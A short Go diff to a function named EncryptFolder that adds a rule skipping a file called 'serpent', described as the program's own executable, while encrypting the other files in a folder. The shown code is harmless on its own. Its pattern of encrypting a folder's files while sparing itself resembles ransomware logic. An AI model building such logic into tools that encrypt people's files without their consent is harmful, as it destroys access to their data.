@@ -83,6 +83,9 @@ func EncryptFolder(folderPath string, key []byte) error {
 		if entry.IsDir() {
 			continue // Skip directories
 		}
+		if entry.Name() == "serpent" {
+			continue // Skip the serpent executable itself
+		}
 		if strings.HasSuffix(entry.Name(), ".go") || strings.HasSuffix(entry.Name(), ".mod") {
 			continue // Skip Go and module files
 		}
